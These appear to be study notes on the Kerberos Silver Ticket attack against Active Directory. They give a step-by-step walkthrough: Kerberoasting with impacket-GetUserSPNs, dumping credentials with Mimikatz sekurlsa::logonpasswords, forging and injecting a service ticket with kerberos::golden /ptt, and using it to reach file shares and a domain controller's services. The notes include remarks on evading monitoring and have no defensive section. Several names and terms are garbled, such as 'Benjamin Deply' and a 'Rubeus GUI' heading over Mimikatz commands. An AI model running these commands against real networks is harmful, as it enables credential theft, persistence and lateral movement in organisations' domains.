[Reference: Netwrix Silver Ticket Attack Guide]()

* Benjamin Deply, the creator of **Mimikatz**, introduced the concept of **Silver Tickets** during his Blackhat 2014 session
* In Silver Ticket attack:
  * The attacker Forge's Ticket Granting Service (TGS) tickets for specific services. 
  * This tickets impersonate a legitimate service within an Active Directory domain. 

* Purpose. 
  * Establish persistence on a compromise system. 
  * Maintain access to services and move laterally within the network. 

* Difference from golden ticket attack? 
  * **Golden ticket** : Uses the password hash of the KRBTGT account. 
  * **Silver ticket** : Uses the password hash of specific service account. 


---

### Attack overview. 

* The attacker uses a compromised service account password hash to craft a valid TGS.
* Once created, the silver ticket grants access to the targeted service as a legitimate user. 
* By obtaining an NTLM hash of one service account, attackers can forge tickets for multiple services. 
* Bypasses Active Directory domain controllers, making detection harder. 

---

### Attack steps. 

#### Step 1:  Obtaining NTLM password hash. 

The attacker first needs to extract the NTLM hash of a service account often by **Kerberoasting**

Kerberoasting involves. 

* Requesting service tickets for service accounts. 
* Performing offline cracking for TGS Tickets to extract service account password. 

Example command to extract service account ticket:

```powershell
impacket-GetUserSPNs infosecwarrior.local/administrator:Password123 -dc-ip <IP> -request -outputfile kerberoasting-hash.txt
```

#### Step 2. Forging the TGS ticket (Silver Ticket) 

Using **Mimikatz** the attacker can forge a TGS (Silver Ticket) using a obtained NTLM password hash. 

**Open Mimikatz and Enable Debug Privileges:**

```cmd
mimikatz.exe
```

```cmd
privilege::debug
```

**Extract Logon Passwords:**

```cmd
sekurlsa::logonpasswords
```

* This step can help find cached credentials if needed

**Forge the TGS Ticket using Mimikatz**

The command structure for forging a Silver Ticket is similar to Golden Ticket, but specifies a service account hash.

Required parameters:

* ``/domain`` : Fully Qualified Domain Name (FQDN) of the domain.
* ``/sid`` : Security Identifier(SID) of the domain.
* ``/user`` : User to impersonate
* ``/target`` : target server FQDN
* ``/service`` : Target service name (e.g., cifs, http, etc)
* ``rc4`` : NTLM hash of the service account password

Example Command:

```cmd
kerberos::golden /user:NonExistentUser /domain:domain.com /sid:<SID> /rc4:<hash> /target:FileServer1.domian.com /service:cifs /ptt
```

* ``/ptt`` flag injects the ticket directly into the current session

**Launch a new command prompt with injected ticket**

```cmd
misc::cmd
```

#### Step 3. Accessing A specific Service

Verify the kerberos ticket is present

```cmd
klist
```

Use the ticket to access network resources:

Example:

```powershell
Find-InterestingFile -Path \\Fileserver1.domain.com\S$\shares\
```


---

#### Step 4. Bypassing Active Directory Communication

Since the silver ticket is already forged, no direct communication with Active Directory is needed for authentication. This helps evade network monitoring tools that inspect Kerberos traffic between endpoints and domain controller. 


---

### Step 5: Forging Privileged Account Certificate (PAC)

The also forge the Privileged Account Certificate (PAC) within the server ticket. 

* The PAC contains the authorization information. 
* Forging it an escalate privileges within the network, even impersonating higher privileged accounts. 

---

### Using Rubeus GUI For Silver Attack

#### Targeting A domain controller's Service

In some scenarios, attackers aim to forge Silver Tickets for services on domain controllers

1. Get the NTLM hash of the DC's computer account (e.g. ``dc.infosecwarrior.local``)
2. For the Silver Ticket:

```cmd
mimikatz.exe
```

```cmd
privilege::debug
```

```cmd
kerberos::golden /sid:<SID> /domain:domain.com /ptt /id:1155 /target:FileServer1.domian.com /service:http /rc4:<hash> /user:beningnadmin
```

3. Confirm ticket injection

```cmd
klist
```



